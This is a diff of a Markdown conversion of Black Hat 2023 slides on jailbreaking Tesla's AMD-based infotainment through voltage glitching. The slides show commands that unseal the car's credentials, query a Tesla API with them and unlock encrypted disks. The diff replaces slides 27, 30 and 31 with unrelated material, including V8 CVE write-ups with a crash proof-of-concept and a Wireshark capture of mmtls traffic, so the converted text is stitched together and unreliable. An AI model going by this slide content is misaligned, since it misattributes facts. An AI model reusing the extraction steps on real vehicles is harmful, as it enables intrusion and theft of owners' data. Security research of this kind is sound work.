@@ -1,6 +1,6 @@
 ---
-title: "Niclas Kühnapfel    Hans Niklas Jacob    Oleg Drokin Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater"
-speakers: ["Christian Werling"]
+title: "Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater"
+speakers: ["Christian Werling", "Niclas Kühnapfel", "Hans Niklas Jacob", "Oleg Drokin"]
 conference: "Black Hat"
 conference_full: "Black Hat USA 2023"
 edition: "USA"
@@ -8,18 +8,25 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Christian Werling _ Niclas Kühnapfel  _ Hans Niklas Jacob  _ Oleg Drokin_Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater.pdf"
 pages: 92
 sha256: "90ec702582fd8fbbc029f42f773a83f87e7bf0585d83fac2736a43b3686c62e4"
-text_chars: 33055
-ocr_pages: 19
+text_chars: 30525
+ocr_pages: 14
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 83.7
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 3
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:15:11Z"
+converted_at: "2026-08-12T04:07:33Z"
 ---
-# Niclas Kühnapfel    Hans Niklas Jacob    Oleg Drokin Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater
+# Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater
 
-**Speakers:** Christian Werling  
+**Speakers:** Christian Werling, Niclas Kühnapfel, Hans Niklas Jacob, Oleg Drokin  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Christian Werling _ Niclas Kühnapfel  _ Hans Niklas Jacob  _ Oleg Drokin_Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater.pdf` (92 pages)
+
 
 ## Slide 1
 
@@ -33,7 +40,8 @@ Chris&an Werling Niclas Kühnapfel TU Berlin Hans Niklas Jacob Oleg Drokin Indep
 
 2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Tesla’s Infotainment Now AMD-Powered
@@ -48,7 +56,8 @@ Parts Catalog Hints
 
 3
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 faulTPM: Exposing AMD fTPMs’ Deepest Secrets
@@ -57,37 +66,28 @@ e
 Technische Universitit Berlin cT
 ur Previous esearc aes
 { hnj, cwerling, roberi.buhren, jpseifert }@sect.tu-berlin.de
-1) mediacec.de ES) OO
-me Oat
 One Glitch to Rule Them All: Fault Injection Attacks Against
 Uncover, Understand, Own - Regai AMD’s Secure Encrypted Virtualization
 trol Over Your AMD CPU
 os Robert Buhren Hans Niklas Jacob
 robert. buhren@sect.tu-berlin.de hnj@sect.tu-berlin.de
 mnische Universitat Berlin - SECT Technische Universitit Berlin - SECT
-bboot
-e and
 Mt the
 Thilo Krachenfels
-tkrachenfels@sect.tu-berl:
 ‘Technische Universitit Berlin - S Technische Universitat Ber!
 Fraunhofer SIT
-(0S).
 fonent
 Uncover, Understand, Own EM-Fault It Yourself: Building a Replicable EMFI
 Setup for Desktop and Server Hardware
 Introduce software-
 Kiihnapfel*, Robert Buhren*, Hans Niklas Jac Thilo Krachenfe! pe ROR spi
-Christian Werling*, Jean-Pierre Seifert* BE trstanciation of
 * Technische Universitit Berlin, Chair of Security in Telecommunications, Germany
 } Fraunhofer SIT, Germany encryption keys
 frure, AMD CPUs
 AMD Secure Pro:
-Eonditions of fe so0t-of-trust for
 One Glitch to Rule Them All: Fault pe vie
 Injection Attacks against AMD’s : —
 Secure Processor Biicting vos
-Robert Buhren B (3-15) and
 Hans Niklas cob Technische Universitat Berlin Insecure Until Proven Updated: fs and CPUs.
 Analyzing AMD SEV’s Remote Attestation | Pagrethe
 Pthe DUT by
@@ -103,7 +103,6 @@ to trust the o¢ high availability of
 berlin
 of this technology. However, outsourcing
 prise data comes at a risk, The technical inf | aagetiseiaad
-Tage glitching,
 among multiple tenants. Executin the cloud is owned by the cloud provider and thus under his
 visor has dir ° mntrol. This J server hardware
 hat allow the co-location of multi
@@ -137,10 +136,10 @@ you don’t know
 
 5
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-8:48 7 oat! > 84)
 @ tesla.com
 < Back to Vehicle Profile
 Upgrades
@@ -295,14 +294,12 @@ NVMe
 
 19
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Verified Boot
-x86 wv
 Coreboot
-eee ackin XH1)
-PET deve 10p/2021. 44. 25. 2-8836-gb025¢688348a |
 Thu Jan 13 14:46:27 UTC 2022 ai 2 2 8836- abt (log leve
 PMxC@ STATUS: @x800 BIT11
 coreboot-archive/develop/2021.44.25.2-8836-gb025c688348a
@@ -310,17 +307,12 @@ Thu Jan 13 14:46:27 UTC 2022 ponecaqe ceaer inal (log level
 POST: x41
 POST: @x42
 POST: 0x43
-POST: Qx34
 POST: x36
 POST: @x92
 POST: x98
 SF size 0x2000000 does not correspond to CONFIG_ROM_SIZE
-0x1000000!!
 POST: 0x44
-coreboot—archive/develop/2021. 44.25.2-8836-gb025c688348a
 ‘Thu Jan 13 14:46:27 UTC 2022 raNstage startind (log level
-Bile co
-POST: x39
 POST: x8@
 POST: 0x70
 POST: x71
@@ -469,33 +461,59 @@ kernel
 
 27
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-—— i
-+ +--39@ lines: 00000000: 7f45 4c46 0201 0100 00200 0000 0200 0000 «ELF --- £46 @201 0100 0000 20020 2000 2000 .ELF
-@0001860: Sdc3 5548 89e5 5348 8did dal3 200@ 4883 ].UH..SH.... .H. 8did dal3 200@ 4883 ].UH..SH.... .H.
-@0001870: ec08 4883 eb@8 488b 0348 83f8 ff74 O4ff ..H...H..H...t.. 0348 83f8 ff74 O4ff ..H...H..H...t.
-@0001880: d@eb ef58 Sb5d c350 e86a fF6ff FF58 c325 ...X[].P.j...X.% e86a f6off ff58 c325 ...X[].P.j...X.%
-@0001890: 752@ 2575 2025 752@ 256c 752@ 256c 7520 u %u %U %lu %lu 256c 752@ 256c 7520 u %uU %U %lu %luU
-@00018a@: 2531 3673 2025 3132 3873 2025 3132 3873 %16s %128s %128s 3873 2025 3132 3873 %16s %128s %128s
-@00018b0: 2025 7500 556e 6b6e 6f77 6e2@ 6572 726f  %u.Unknown erro 6f77 6e20 6572 726f  %u.Unknown erro
-@00018c@: 720@ 3200 342e 3100 7265 7374 6172 745f 1r.2.4.1.restart_ fee? 6e6f 7265 5f63 r.2.4.1.ignore_c
-000018d0: 6f6e 5f63 6f72 7275 7074 696f 6e20 0075 on_corruption .u e2@ 2020 2020 0075 orruption U
-Q00018e0: 7365 5f66 6563 5f66 726f 6d5f 6465 7669 se_fec_from_devi 726f 6d5f 6465 7669 se_fec_from_devi
-@00018f@: 6365 2025 7320 6665 635f 726f 6f74 7320 ce %s fec_roots 635f 726f 6f74 7320 ce %s fec_roots
-@0001900: 2575 2066 6563 5f62 6c6f 636b 7320 256c %u fec_blocks %l 6c6f 636b 7320 256c %u fec_blocks %l
-@0001910: 752@ 6665 635f 7374 6172 7420 2531 246c wu fec_start %1$1 6172 7420 256¢ 7520 u fec_start %lu
-00001920: 7520 6c69 6e65 6172 2025 3324 7320 3020 u linear %3$s 0 per 6974 7920 2575 .0 %lu verity %u
-00001930: 2325 3131 2473 2000 7520 2575 2025 6c75 #%11$s .u %u %lu 520 2575 2025 6c75 %s %s %u %u %lu
-@0001940: 2025 6c75 2025 7320 2573 2025 7300 2025 %lu %s %s %S. % 2573 2025 7300 2025 %lu %s %s %s. %
-00001950: 7a75 2025 7300 2f75 7372 2f73 6269 6e2f zu %s./usr/sbin/ 7372 273 6269 6e2f zu %s./usr/sbin/
-Q0001960: 646d 7365 7475 700@ 6372 6561 7465 @@2d dmsetup.create. - 6372 6561 7465 002d dmsetup.create. -
-Q0001970: 720@ 2d2d 7461 626c 650@ 7265 6d6f 7665 r.--table.remove 6500 7265 6d6f 7665 r.--table.remove
-@0001980: Q@2d 2d66 6f72 6365 O@2d 2d72 6574 7279 .--force.--retry @02d 2d72 6574 7279 .--force.--retry
-@0001990: Q@2d 2d64 6566 6572 7265 640@ 4553 5550. .--deferred.ESUP 7265 640@ 4553 5550 .--deferred.ESUP
-+ +--453 lines: @00019a@: 4552 4241 4400 496e 7661 6c69 6420 7375 ERBAD. Invalid su--- B41 4400 496e 7661 6c69 6420 7375 ERBAD.Invalid su---
-19.06.23 27
+CVE-2024-5838
+
+What happend if we confuse these two
+structures?
+
+=> Fake a callable object.
+
+[terminal panel, top right]
+DebugPrint: 0x2b200049aa1: [JSArray]
+ - map: 0x02b20018d095 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x02b20018ca09 <JSArray[0]>
+ - elements: 0x02b200049941 <FixedDoubleArray[43]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 43
+ - properties: 0x02b200000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x2b200000d99: [String] in ReadOnlySpace: #length: 0x02b20028818d <AccessorInfo name= 0x02b200000d99 <String[6
+ }
+ - elements: 0x02b200049941 <FixedDoubleArray[43]> { // <--- [10]
+       0-42: 1.1
+ }
+...
+
+DebugPrint: 0x266200049a81: [WasmTrustedInstanceData]
+ ...
+ - dispatch_table_for_imports: 0x266200049a41 <WasmDispatchTable[1]> // <--- [9]
+ ...
+
+[terminal panel, bottom right]
+Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+0x0000555556896f17 in v8::internal::HeapObject::HeapObjectPrint(std::__Cr::basic_ostream<char, std::__Cr::char_traits<char> >&) ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+--------------------------------------------------------------------------------
+*RAX  0x2b200000000 <-- 0x40940
+ RBX  0x555557f77540 --> 0x555557d93098 (vtable for v8::internal::StdoutStream+24) --> 0x5555567d4200 (v8::internal::StdoutStream::~StdoutStream(
+*RCX  0x9999999a
+ RDX  0xc
+ RDI  0x7fffffffcc58 --> 0x2b200049a41 <-- 0x9a3ff19999999999
+ RSI  0x555557f77540 --> 0x555557d93098 (vtable for v8::internal::StdoutStream+24) --> 0x5555567d4200 (v8::internal::StdoutStream::~StdoutStream(
+ R8   0x555557f77598 --> 0x555557d930c0 (vtable for v8::internal::StdoutStream+64) --> 0x5555567d4600 (virtual thunk to v8::internal::StdoutStrea
+ R9   0x20
+ R10  0x7ffff41fddd8 <-- 0x2
+*R11  0xafc527c8e4c063c3
+ R12  0x555557dea728 (vtable for std::__Cr::basic_ios<char, std::__Cr::char_traits<char> >+16) --> 0x555557b9e530 (std::__Cr::basic_ios<wchar_t,
+ R13  0x555557e2f388 (v8::internal::MainCage::base_) --> 0x2b200000000 <-- 0x40940
+*R14  0x2b200049a41 <-- 0x9a3ff19999999999
+*R15  0x2b200049a40 <-- 0x3ff199999999999a
+ RBP  0x7fffffffcc40 --> 0x7fffffffcc70 --> 0x7fffffffcca0 --> 0x7fffffffcce0 --> 0x7ffff41fddf8 <-- ...
+ RSP  0x7fffffffcc10 --> 0x555557f77540 --> 0x555557d93098 (vtable for v8::internal::StdoutStream+24) --> 0x5555567d4200 (v8::internal::StdoutSt
+ RIP  0x555556896f17 (v8::internal::HeapObject::HeapObjectPrint(std::__Cr::basic_ostream<char, std::__Cr::char_traits<char> >&)+39) <-- movzx eax,
 ```
 
 ## Slide 28
@@ -546,113 +564,63 @@ kernel
 
 30
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-Tesla OS Loader ' # Patch |
-ee |
-00101b11
-00101b14
-@0101b19
-@0101ble
-0101b23
-00101b26
-@0101b29
-00101b2c
-00101b2f
-00101b32
-0101b34
-00101b37
-00101b38
-00101b39
-0101b3e
-@0101b41
-00101b44
-@0101b48
-00101b4a
-0101b4d
-0101b52
-@0101b57
-0101b5a
-0101b5d
-LAB_00101b11
-SUB
-PUSH
-PUSH
-CALL
-ADD
-MOV
-SUB
-MOV
-MOV
-ADD
-SUB
-PUSH
-PUSH
-CALL
-ADD
-MOV
-CMP
-IZ
-SUB
-PUSH
-CALL
-ADD
-SUB
-PUSH
-s_Verifying_nvme_image..._@011516
-s_[tes la-os-loader]_%s_@0114c51
-puts
-0x1
-,dword ptr
-,dword ptr
-,»dword ptr
-,dword ptr
-Oxé
-2
-FUN_00100b96
-0x1
-dword ptr [
-dword ptr [
-LAB_00101b88
-A)
-s_[tesla-os-loader]_Invalid_boot_
-puts
-0x10
-@x
-,
-dword ptr [
-}
-= FUN_@0100b96(
-)
-puts(
-*param_3 =
-puts(
-return
-}
-puts (
-uVar2 = FUN_@0100c@a(local_24);
-FUN_01000f4(uVar2, 0x20);
-puts (&DAT_00114beb);
-+
-,
-}
-:
-else {
-puts(s_[tesla-os-Loader]_Invalid_boot_c_00114d78);
-uVar2 = FUN_@010@cOa(local_24);
-FUN_001000f4(UVar2,0x20);
-puts (&DAT_@0114beb);
-}
-}
-}
-*xparam_3 = 0;
-+
-}
-else {
-}
-return 0;
-puts(s_[tesla-os—loader]_%s_@0114c51,5_ERROR:_Could_not_find_or_initial_00114f74);
+CVE-2024-8638
+
+[left panel]
+# CMD: /tmp/d8-linux-debug-v8-component-95842/d8 --allow-natives-syntax --jit-fuzzing poc.js
+# OUTPUT ==============================================================
+
+#
+# Fatal error in ../../src/objects/shared-function-info-inl.h, line 911
+# Debug check failed: HasWasmExportedFunctionData().
+#
+#
+#
+#FailureMessage Object: 0x7ffd2b60ead0
+==== C stack trace ===============================
+
+   /tmp/d8-linux-debug-v8-component-
+95842/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7f831d74b153]
+   /tmp/d8-linux-debug-v8-component-95842/libv8_libplatform.so(+0x199ed) [0x7f831d6f39ed]
+   /tmp/d8-linux-debug-v8-component-95842/libv8_libbase.so(V8_Fatal(char const*, int, char const*,
+...)+0x194) [0x7f831d72c854]
+   /tmp/d8-linux-debug-v8-component-95842/libv8_libbase.so(+0x2c265) [0x7f831d72c265]
+   /tmp/d8-linux-debug-v8-component-
+95842/libv8.so(v8::internal::SharedFunctionInfo::wasm_exported_function_data(v8::internal::PtrComprCage
+Base) const+0xa3) [0x7f831a87b143]
+   /tmp/d8-linux-debug-v8-component-95842/libv8.so(+0x3ffb012) [0x7f831bdfb012]
+   /tmp/d8-linux-debug-v8-component-95842/libv8.so(+0x3fda1fb) [0x7f831bdda1fb]
+   /tmp/d8-linux-debug-v8-component-95842/libv8.so(v8::internal::Runtime_WasmCompileWrapper(int,
+unsigned long*, v8::internal::Isolate*)+0x90) [0x7f831bdd9a30]
+   /tmp/d8-linux-debug-v8-component-95842/libv8.so(+0x1f65dd7) [0x7f8319d65dd7]
+
+[right panel]
+d8.test.enableJSPI();
+d8.test.installConditionalFeatures();
+d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
+const sig = makeSig([kWasmI32], []);
+const builder = new WasmModuleBuilder();
+const _type = builder.addType(sig);
+const _import = builder.addImport('m', 'foo', _type);
+const _table = builder.addTable(kWasmAnyFunc, 10).index;
+builder.addExportOfKind(sig, builder, _import, _table);
+builder.addFunction('main', _type).addBody([
+  kExprLocalGet, 0,
+  kExprI32Const, 0,
+  kExprTableGet, _table,
+  kGCPrefix,
+  kExprRefCast, _type,
+  kExprCallRef, _type
+]).exportFunc();
+const func = new WebAssembly.Function(
+  { parameters: ['i32'], results: [] },
+  () => 12);
+const instance = builder.instantiate({ 'm': { 'foo': func } });
+instance.exports.main(15);
 ```
 
 ## Slide 31
@@ -661,43 +629,46 @@ puts(s_[tesla-os—loader]_%s_@0114c51,5_ERROR:_Could_not_find_or_initial_00114f
 
 31
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-Tesla OS Loader ' # Patch |
-Saas
-Listing: tesla-
-LAB_00101b11
-@0101b11 83 SUB 0x8 ~ = FUN_00100b96(
-@0101b14 68 PUSH s_Verifying_nvme_image..._@011516 ==01-t
-11 puts(
-@0101b19 68 PUSH s_[tesla-os-loader]_%s_0@114c51 *param_3 =
-11 puts (
-@0101ble e8 CALL puts return
-00 }
-@0101b23 83 ADD 10x16 puts(
-@0101b26 8b MoV ,dword ptr a C uVar2 = FUN_@0100c@a(local_24);
-@0101b29 2b SUB ,dword ptr a1_18 FUN_001000f4(uVar2, 0x20);
-@01@1b2c 8b Mov ,dword ptr Local_10 puts (&DAT_00114beb);
-@0101b2f 8b 5 MOV ,dword ptr local_18 +
-@0101b32 01 ADD ' ,
-00101b34 83 SUB 0x8 }
-00101b37 50 PUSH :
-00101b38 52 PUSH else {
-@0101b39 e8 CALL FUN_@01@0b96 puts(s_[tesla-os-Loader]_Invalid_boot_c_00114d78);
-ff uVar2 = FUN_0010@c@a(local_24);
-@0101b3e 83 ADD 0x1 FUN_001000f4(UVar2,0x20);
-@0101b41 89 MoV dword ptr [ C 4 puts (&DAT_00114beb) ;
-00101b44 83 cMP dword ptr [ 124] ,0x@ }
-@0101b48 eb IMP} LAB_00101b88 }
-00101b4a 83 SUB ,OXxc }
-00101b4d 68 PUSH s_[tesla-os-loader]_Invalid_boot_ *param_3 = 0;
-11 +
-@0101b52 e8 CALL puts }
-00 else {
-@0101b57 83 ADD A) puts(s_[tesla-os—loader]_%s_@0114c51,5_ERROR:_Could_not_find_or_initial_00114f74);
-00101b5a 83 SUB Ox }
-@0101b5d ff PUSH dword ptr [ 1.24 return 0;
+Motivation
+
+What's being sent?          Is the encryption sound?          Why custom encryption?
+
+[Wireshark packet list]
+No.      | Time  | Source        | Destination    | Protocol | Length | Info
+  33 170...  Android.local  43.130.30.2...  HTTP       652  POST /mmtls/7d44b6a2 HTTP/1.1
+  76 170...  Android.local  49.51.67.253    HTTP       658  POST /mmtls/2a9b1264 HTTP/1.1
+  92 170...  Android.local  49.51.67.253    HTTP       392  POST /mmtls/2a9b1264 HTTP/1.1
+ 111 170...  Android.local  49.51.67.253    HTTP       713  POST /mmtls/582198f5 HTTP/1.1
+ 116 170...  Android.local  49.51.67.253    HTTP       863  POST /mmtls/582198f5 HTTP/1.1
+ 121 170...  Android.local  49.51.67.253    HTTP       670  POST /mmtls/582198f5 HTTP/1.1
+ 126 170...  Android.local  49.51.67.253    HTTP       670  POST /mmtls/582198f5 HTTP/1.1
+ 134 170...  Android.local  49.51.67.253    HTTP       730  POST /mmtls/582198f5 HTTP/1.1
+
+[packet detail pane - lines clipped at pane edge]
+> Frame 92: 392 bytes on wir
+> Ethernet II, Src: Android.
+> Internet Protocol Version
+> Transmission Control Proto
+> [5 Reassembled TCP Segment
+> Hypertext Transfer Protoco
+> Data (5704 bytes)
+
+[hex pane]
+00e0   43 6c 69 65 6e 74 0d 0a   0d 0a 19 f1 04 00 a1 00
+00f0   00 00 9d 01 04 f1 01 00   a8 4f 67 76 fb b4 66 8f
+0100   2a 36 bb 55 74 94 c4 0c   cd c8 bb f4 44 41 b0 24
+0110   d8 8e c4 86 29 cc 35 e2   1b 65 6e 78 3c 00 00 00
+0120   6f 01 00 00 00 6a 00 0f   01 00 00 00 63 01 00 09
+0130   3a 80 00 00 00 00 00 3d   00 0c ce 4f 44 55 2e a9
+0140   34 fc aa d4 e9 af 00 48   00 f2 e6 a8 76 9f b1 1a
+0150   95 cc b8 9b aa 47 4a 75   e1 41 fc ef 7a f6 fc ba
+0160   89 30 ca 4e ff fe dc 68   23 bb fe 14 69 09 64 54
+0170   0b 40 a4 49 9b d5 6f 7b   69 7f 3e e6 9e 2b 18 fe
+0180   75 68 6c b5 15 70 80 a6   06 59 9e 00 f8 bc 1f 3e
 ```
 
 ## Slide 32
@@ -1040,9 +1011,9 @@ normally comparison
 Error
 print(„Incorrect!“)
 
-```
+\```
 print(„Correct!“)
-```
+\```
 
 46
 
@@ -1152,20 +1123,6 @@ SPI chip-select
 
 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Voltage Glitch Wiring
-SVI2 bus (SVD + SVC)
-Dot
-a> esa
-Lv.
-—
-SPI chip-select
-use gon04
-52
-```
-
 ## Slide 53
 
 Glitch Setup in Reality
@@ -1240,23 +1197,6 @@ success
 - VSoC stable
 
 56
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Voltage Glitch Steps
-svizsve VM fh
-svizsv> | | a
-BV MAA AAA
-VSOC isv
-SPICS “™
-failed Low
-sPICcs “™
-SUCCESS Low
-e VR sends telemetry packets
-e VSOoC stable
-56
-```
 
 ## Slide 57
 
@@ -1399,15 +1339,13 @@ Trying to AcGvate the Rear Seat Heaters
 
 64
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Finding their Configuration ID
-eee
-1 {
 2 "accessId": 13,
 3 "codeKey": "rearSeatHeaters",
-4 "content': i
 5 "enums": [
 6 {
 7 "codeKey": "NONE",
@@ -1437,11 +1375,11 @@ SSH console
 
 65
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 72/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 deploy@psp-deploy:~/tesla—-hacking$ picocom /dev/ttyUSBHUB1® —b 115200 | tee -a $(|deploy@psp-deploy:~/tesla/fi-attack$ python3 start-tesla.py -r ../../tesla-hacking/
-date +"%Y_%m_%d").log roms/boot_nvme. bin
 Serial console
 Attack script
 deploy@psp-deploy:~$ ssh -t root@192.168.90.10@ ‘bash’
@@ -1494,7 +1432,8 @@ Trying to AcGvate the Rear Seat Heaters
 
 69
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ZERO DAY
@@ -1504,14 +1443,12 @@ July 18th, 2023
 (Pwn20wn) Tesla Model 3 Gateway Firmware Signature Validation Bypass Vulnerability
 ZDI-23-972
 ZDI-CAN-20734
-CVE ID
 CVSS SCORE
 AFFECTED VENDORS
 AFFECTED PRODUCTS
 VULNERABILITY DETAILS
 ADDITIONAL DETAILS
 CVE-2023-32156
-9.0, (AV:A/AC:L/PR:L/UI:N/S:C/C:H/1:H/A:H)
 Tesla
 Model 3
 This vulnerability allows network-adjacent attackers to execute arbitrary code on affected Tesla Model 3 vehicles. An attacker
@@ -1881,12 +1818,12 @@ TPM Object
 
 84
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Finding the Car Credentials
 x hnj@piepmatz: ~/Projects/psp/tesia/ftpm-offline Qe
-+ x ftpm-offiine. 2
 (venv) hnj@piepmatz:~/Projects/psp/tesla/ftpm-offline$ cat ../car_creds/car.key
 ----4BEGIN TSS2 PRIVATE KEY;----
 =
@@ -1908,17 +1845,14 @@ Payload
 
 85
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Unsealing the Car Credentials
-x ‘hnj@piepmatz: ~/Projects/psp/tesia/ttpm-offline aes
-+ x ‘fApm-offiine. 2
 (venv) hnj@piepmatz:~/Projects/psp/tesla/ftpm-offline$ python3 unseal-tesla-car-creds.py from-image
 ../boot_nvme.bin $(xxd -p -c32 ../ftpm-seed.bin) ../car_creds/car.key >../car_creds/car.key.clear
-j@piepmatz :~/Projects/php/tesla/ftpm-offline$ cat k/car_creds/car.key.clear
 =---5 BEGIN PRIVATE KEY-----
-YY
 (venv) hnj@piepmatz :~/Projects/psp/tesla/ftpm-offlineS [J
 85
 ```
@@ -1931,11 +1865,11 @@ Using the Car CredenGals
 
 86
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 x hnj@piepmatz: ~/Projects/psp/tesla/ftpm-offline QqQn «a
-+ * ftpm-offline co)
 (venv) hnj@piepmatz:~/Projects/psp/tesla/ftpm-offline$ echo -e "GET /mothership/vehicles// HTTP/1.0\r\n"
 | openssl s_client -connect api-prd.vn.tesla.services:443 -cert ../car_creds/car.crt -verify_quiet -quiet -ign_eof -nocomm
 ands -key ../car_creds/car.key.clear
@@ -1954,18 +1888,12 @@ X-Content-Type-Options: nosniff U Sl ng t al e Ca r Cred e nt a Is
 X-Download-Options: noopen
 X-Permitted-Cross-Domain-Policies: none
 Referrer-Policy: strict-origin-when-cross-origin
-X-TX1D:
 Cache-Control: max-age=8, private, must-revalidate
-X-Request-I¢d: DIT
 X-Runtine: i
 Strict-Transport-Security: max-age=31536000; includeSubDomains
 Content-Security-Policy: default-sre ‘none’
-{"id" : | Vin": ee" icknane" :" ee", last_seen" : EEE, “Created_at" :
-,"current_version” :"develop/20623 .2¢. NN", "current_version_time" :null, "active" : true, "cell_number” :nul1, "countr
 y":"US", "backseat_token" :null, "backseat_token_updated_at" :null, "radio_config" :null, “service_possession" :false, "hermes_capa
-ble" :true, "factory_gated” :true, "delivered" :true, "model" :"3","use_country" :null, "service_state" :null, "connection_id" :nu1l, "
 connection_region" :"aws:us-west-2", "birthplace" :"fremont-factory”, "do_not_disturb_until":null, “device_type":"vehicle", “is_
-customer" :true, "state":"asleep", "odin_grablogs" : false, “type":"Vehicle"}
 (venv) hnj@piepmatz:~/Projects/psp/tesla/ftpm-offlines |
 86
 ```
@@ -1979,7 +1907,8 @@ customer" :true, "state":"asleep", "odin_grablogs" : false, “type":"Vehicle"}
 
 87
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Extracting the Disk Encryption Keys
@@ -1989,14 +1918,8 @@ No usable token is available.
 iKey slot @ unlocked.
 Command successful.
 [rootefatbox3 ~]# cryptsetup -v LuksOpen --header /tmp/m3/home.luks /tmp/m3/home
-x deploy @psp~deploy:—
-+ x fipm-offing
 bash-3.2# strings /dev/tle/home.luks | grep -m 1 sealed | jq
-‘ “keyslots": {
-narre(
-sido ee m3-home --key-file /tmp/m3/home.key
 "af": 4 : No usable token is available.
-zi UAtcsamatidsaral Key slot ® unlocked.
 Command successful.
 [root@fatbox3 ~]# blkid /dev/mapper/m3-home
 /dev/mapper/m3-home: LABEL="Home" UUID=""
@@ -2006,31 +1929,18 @@ OCK_SIZE="4096" TYPE="ext4"
 [root@fatbox3 ~]# cat /mnt/var/vin
 cat: /mnt/var/vin: No such file or directory
 [root@fatbox3 ~]# cat /mnt/var/etc/vin
-—
 [root@fatbox3 ~]# sqlite3 /mnt/home/tesla/.Tesla/data/PhonebookV2.db "select «* f
 rom vcards limit 15"
-+ ftom-offiine
 (venv) hnj@piepmatz:~/Projects/psp/tesla/ftpm-of fl
 from-image ../boot_nvme.bin $(xxd -p -c32 ../ftpm-sed
-7f66a65523e6ebde89bf667d8b779d4aa21d759F 597 F42eec4ed
-74e895a061 £1651 f6a9d5cd187f8815996481adc
 (venv) hnj@piepmatz:~/Projects/psp/tesla/ftpm-offli
 "BL
-be,
-kd: {
 "type": "pbkdf2",
 “hash": "sha256",
 “iterations”: 1000,
-} "salt": “eE9dseA9GNZtgpbKyBOSDdUM20DymUZQvbdogDVNSNo="
 }
-},
 "tokens": {
-"gr: {
-"type": "verypt",,
 “keyslots”: [
-20974|4| |ALice | MM m92 | 1111 {| | | a | | 5; 10
-JAAUAAGACWAA\
-WAC#+ACCj2Gb3QEb /AASTORLAV1Gi \nRu9j|
 ZwfvQdWSLFYR7YkTmer \nefMdy jRaXp96HF
 87
 ```
